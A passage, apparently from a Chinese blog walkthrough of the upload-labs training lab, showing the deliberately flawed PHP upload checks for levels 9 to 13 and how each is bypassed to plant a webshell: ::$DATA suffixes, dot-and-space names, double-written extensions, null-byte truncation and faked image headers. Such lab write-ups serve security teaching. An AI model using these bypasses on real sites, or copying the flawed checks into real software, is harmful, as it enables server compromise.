<span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了对字符串<code>::$DATA</code>的检测，因此使用bp在文件末尾添加对应字符，连接成功。<br>查询之后发现：在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名<br>例如:”<code>phpinfo.php::$DATA</code>“Windows会自动去掉末尾的<code>::$DATA</code>变成”<code>phpinfo.php</code>“</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h2><p>这次发现把前面能用的几种方法全部堵死了。但是可以发现：php文件会先删除.，再删除空格。所以可以修改后缀为<code>webshell.php. .</code>来绕过，经过处理之后变成<code>webshell.php.</code>，这样就可以上传了。</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h2><p>这次会对违规的部分直接移除，导致上传的php后缀文件后缀缺失。这种情况下，这种移除的情况都可以使用双写绕过，即修改为<code>webshell.pphphp</code>上传，这样上传后的文件后缀就会修改为正常的<code>.php</code>，可以正常连接。</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h2><p>这次是使用白名单过滤，而且</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>所以可以使用%00的截断绕过，即：<br>先上传<code>webshell.jpg</code>然后使用bp抓包，将<code>save_path</code>参数修改为以下即可上传：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673689610306-ac532bbc-e2d6-4061-b1f3-377b4bb35972.png" alt="image.png"></p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>php版本要小于<code>5.3.4</code> 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为OFF状态</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h2><p>与上一关相比，这次的<code>save_path</code>参数是在<code>POST</code>内的，但是在<code>POST</code>中加<code>%00</code>参数不行，因为会被解析为字符串，但肯定还是使用<code>00</code>来截断，因此这道题需要修改<code>hex</code>。<br>先上传<code>webshell.jpg</code>文件，修改保存路径，并在末尾添加一个字符<code>a</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771713001-3916d4ff-baf3-42db-b504-02a210287690.png" alt="image.png"><br>然后打开Burpsuite的<code>Hex</code>模式，找到对应<code>a</code>字符的hex值修改为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771889576-21235d91-3988-49a5-a490-67217b152112.png" alt="image.png"><br>也可以raw模式下选中a修改hex为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771934277-9f2bddb4-fe97-41cf-90ce-64de637342fa.png" alt="image.png"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h2><p><code>getReailFileType()</code>函数获取文件的最开始两个字节，来判断文件类型，因此可以使用图片文件欺骗来进行攻击。不同类型文件文件头标准编码是不同的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">JPEG</span> (jpg)，文件头：FF D8 FF</span><br><span class="line"><span class="title function_ invoke__">PNG</span> (png)，文件头：<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span>     【参考：png文件头详解】<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</span><br><span class="line"><span class="title function_ invoke__">GIF</span> (gif)，文件头：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="comment">//常用47 49 46 38 39 61 标识GIF89a</span></span><br><span class="line">Windows <span class="title function_ invoke__">Bitmap</span> (bmp)，文件头：<span class="number">42</span> <span class="number">4</span>D [参考：bmp文件格式详解]<span class="number">42</span> <span class="number">4</span>D <span class="number">36</span> <span class="number">0</span>C <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">36</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">56</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">python反编译文件pyc的头：<span class="number">03</span> F3 <span class="number">0</span>D <span class="number">0</span>A  （实验吧，py的交易会用到）</span><br><span class="line">pyd的文件头：<span class="number">4</span>D <span class="number">5</span>A <span class="number">90</span> <span class="number">00</span></span><br><span class="line">ZIP <span class="title function_ invoke__">Archive</span> (zip)，文件头：<span class="number">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span> ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件</span><br><span class="line">rar文件: <span class="number">52</span> <span class="number">61</span> <span class="number">72</span> <span class="number">21</span></span><br><span class="line"><span class="number">7</span>z文件头：<span class="number">37</span> <span class="number">7</span>A BC AF <span class="number">27</span> <span class="number">1</span>C（实验吧，有趣的文件用到了）</span><br><span class="line">MS Word/<span class="title function_ invoke__">Excel</span> (xls.<span class="keyword">or</span>.doc)，文件头：D0CF11E0</span><br><span class="line"><span class="title function_ invoke__">CAD</span> (dwg)，文件头：<span class="number">41433130</span></span><br><span class="line">Adobe <span class="title function_ invoke__">Photoshop</span> (psd)，文件头：<span class="number">38425053</span></span><br><span class="line">Rich Text <span class="title function_ invoke__">Format</span> (rtf)，文件头：<span class="number">7</span>B5C727466</span><br><span class="line"><span class="title function_ invoke__">XML</span> (xml)，文件头：<span class="number">3</span>C3F786D6C</span><br><span class="line"><span class="title function_ invoke__">HTML</span> (html)，文件头：<span class="number">68746</span>D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：<span class="number">44656</span>C69766572792D646174653A</span><br><span class="line">Outlook <span class="title function_ 